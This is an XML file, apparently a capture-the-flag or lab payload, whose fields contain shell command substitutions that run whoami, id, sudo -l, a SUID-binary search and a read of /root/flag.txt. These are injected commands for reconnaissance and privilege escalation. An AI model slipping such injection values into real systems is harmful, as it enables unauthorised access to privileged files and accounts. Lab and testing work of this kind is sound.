<?xml version="1.0"?>
<results>
  <whoami>$(whoami)</whoami>
  <id>$(id)</id>
  <flag>$(cat /root/flag.txt 2>&1)</flag>
  <sudo>$(sudo -l 2>&1)</sudo>
  <suid>$(find / -perm -u=s -type f 2>/dev/null | head -5)</suid>
</results>
